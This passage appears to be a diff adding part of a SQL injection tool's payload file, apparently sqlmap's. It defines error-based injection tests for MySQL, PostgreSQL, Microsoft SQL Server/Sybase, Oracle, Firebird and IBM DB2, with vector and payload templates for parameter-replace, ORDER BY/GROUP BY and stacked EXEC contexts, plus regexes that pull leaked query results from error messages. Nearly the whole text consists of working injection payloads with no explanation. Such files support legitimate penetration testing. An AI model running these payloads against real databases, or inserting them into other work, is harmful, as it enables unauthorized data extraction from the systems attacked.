+        <risk>1</risk>
+        <clause>1,3</clause>
+        <where>3</where>
+        <vector>(SELECT [RANDNUM]=('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]'))</vector>
+        <request>
+            <payload>(SELECT [RANDNUM]=('[DELIMITER_START]'||(SELECT CASE [RANDNUM] WHEN [RANDNUM] THEN 1 ELSE 0 END FROM RDB$DATABASE)||'[DELIMITER_STOP]'))</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>Firebird</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>IBM DB2 error-based - Parameter replace</title>
+        <stype>2</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>1,3</clause>
+        <where>3</where>
+        <vector>RAISE_ERROR('70001','[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')</vector>
+        <request>
+            <payload>RAISE_ERROR('70001','[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM SYSIBM.SYSDUMMY1)||'[DELIMITER_STOP]')</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>IBM DB2</dbms>
+        </details>
+    </test>
+    <!-- End of error-based tests - Parameter replace -->
+
+    <!-- Error-based tests - ORDER BY, GROUP BY clause -->
+    <test>
+        <title>MySQL &gt;= 5.5 error-based - ORDER BY, GROUP BY clause (BIGINT UNSIGNED)</title>
+        <stype>2</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <clause>2,3</clause>
+        <where>1</where>
+        <vector>,(SELECT [RANDNUM] FROM (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))x)</vector>
+        <request>
+            <payload>,(SELECT [RANDNUM] FROM (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))x)</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.5</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 5.5 error-based - ORDER BY, GROUP BY clause (EXP)</title>
+        <stype>2</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <clause>2,3</clause>
+        <where>1</where>
+        <vector>,(SELECT [RANDNUM] FROM (SELECT EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))x)))s)</vector>
+        <request>
+            <payload>,(SELECT [RANDNUM] FROM (SELECT EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))x)))s)</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.5</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 5.6 error-based - ORDER BY, GROUP BY clause (GTID_SUBSET)</title>
+        <stype>2</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <clause>2,3</clause>
+        <where>1</where>
+        <vector>,GTID_SUBSET(CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM])</vector>
+        <request>
+            <payload>,GTID_SUBSET(CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'),[RANDNUM])</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.6</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 5.7.8 error-based - ORDER BY, GROUP BY clause (JSON_KEYS)</title>
+        <stype>2</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <clause>2,3</clause>
+        <where>1</where>
+        <vector>,(SELECT [RANDNUM] FROM (SELECT JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]')) USING utf8))))x)</vector>
+        <request>
+            <payload>,(SELECT [RANDNUM] FROM (SELECT JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]')) USING utf8))))x)</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.7.8</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 5.0 error-based - ORDER BY, GROUP BY clause (FLOOR)</title>
+        <stype>2</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>2,3</clause>
+        <where>1</where>
+        <vector>,(SELECT 1 FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)</vector>
+        <request>
+            <payload>,(SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.0</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE)</title>
+        <stype>2</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>2,3</clause>
+        <where>1</where>
+        <vector>,EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'))</vector>
+        <request>
+            <payload>,EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'))</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.1</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 5.1 error-based - ORDER BY, GROUP BY clause (UPDATEXML)</title>
+        <stype>2</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <clause>2,3</clause>
+        <where>1</where>
+        <vector>,UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM1])</vector>
+        <request>
+            <payload>,UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'),[RANDNUM1])</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.1</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 4.1 error-based - ORDER BY, GROUP BY clause (FLOOR)</title>
+        <stype>2</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>2,3</clause>
+        <where>1</where>
+        <vector>,(SELECT [RANDNUM] FROM (SELECT ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x))s)</vector>
+        <request>
+            <payload>,(SELECT [RANDNUM] FROM (SELECT ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x))s)</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 4.1</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>PostgreSQL error-based - ORDER BY, GROUP BY clause</title>
+        <stype>2</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>2,3</clause>
+        <where>1</where>
+        <vector>,(CAST('[DELIMITER_START]'||([QUERY])::text||'[DELIMITER_STOP]' AS NUMERIC))</vector>
+        <request>
+            <payload>,(CAST('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))::text||'[DELIMITER_STOP]' AS NUMERIC))</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>PostgreSQL error-based - ORDER BY, GROUP BY clause (GENERATE_SERIES)</title>
+        <stype>2</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <clause>2,3</clause>
+        <where>1</where>
+        <vector>,(CAST('[DELIMITER_START]'||([QUERY])::text||'[DELIMITER_STOP]' AS NUMERIC))</vector>
+        <request>
+            <payload>,(CAST('[DELIMITER_START]'||(SELECT 1 FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) LIMIT 1)::text||'[DELIMITER_STOP]' AS NUMERIC))</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Microsoft SQL Server/Sybase error-based - ORDER BY clause</title>
+        <stype>2</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>3</clause>
+        <where>1</where>
+        <vector>,(SELECT [RANDNUM] WHERE [RANDNUM]=CONVERT(INT,(SELECT '[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]')))</vector>
+        <request>
+            <payload>,(SELECT [RANDNUM] WHERE [RANDNUM]=CONVERT(INT,(SELECT '[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]')))</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+            <dbms>Sybase</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Oracle error-based - ORDER BY, GROUP BY clause</title>
+        <stype>2</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>2,3</clause>
+        <where>1</where>
+        <vector>,(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(REPLACE(REPLACE(REPLACE(([QUERY]),' ','[SPACE_REPLACE]'),'$','[DOLLAR_REPLACE]'),'@','[AT_REPLACE]'))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)</vector>
+        <request>
+            <payload>,(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Firebird error-based - ORDER BY clause</title>
+        <stype>2</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <clause>3</clause>
+        <where>1</where>
+        <vector>,(SELECT [RANDNUM]=('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]'))</vector>
+        <request>
+            <payload>,(SELECT [RANDNUM]=('[DELIMITER_START]'||(SELECT CASE [RANDNUM] WHEN [RANDNUM] THEN 1 ELSE 0 END FROM RDB$DATABASE)||'[DELIMITER_STOP]'))</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>Firebird</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>IBM DB2 error-based - ORDER BY clause</title>
+        <stype>2</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <clause>3</clause>
+        <where>1</where>
+        <vector>,RAISE_ERROR('70001','[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')</vector>
+        <request>
+            <payload>,RAISE_ERROR('70001','[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM SYSIBM.SYSDUMMY1)||'[DELIMITER_STOP]')</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>IBM DB2</dbms>
+        </details>
+    </test>
+    <!--
+         TODO: if possible, add payload for SQLite, Microsoft Access
+         and SAP MaxDB - no known techniques at this time
+    -->
+    <!-- End of error-based tests - ORDER BY, GROUP BY clause -->
+
+    <!-- Error-based tests - stacking -->
+    <test>
+        <title>Microsoft SQL Server/Sybase error-based - Stacking (EXEC)</title>
+        <stype>2</stype>
+        <level>2</level>
+        <risk>1</risk>
+        <clause>1-8</clause>
+        <where>1</where>
+        <vector>;DECLARE @[RANDSTR] NVARCHAR(4000);SET @[RANDSTR]=(SELECT '[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]');EXEC @[RANDSTR]</vector>
+        <request>
+            <payload>;DECLARE @[RANDSTR] NVARCHAR(4000);SET @[RANDSTR]=(SELECT '[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]');EXEC @[RANDSTR]</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+            <dbms>Sybase</dbms>
+        </details>
+    </test>
+    <!-- End of error-based tests - stacking -->
+</root>
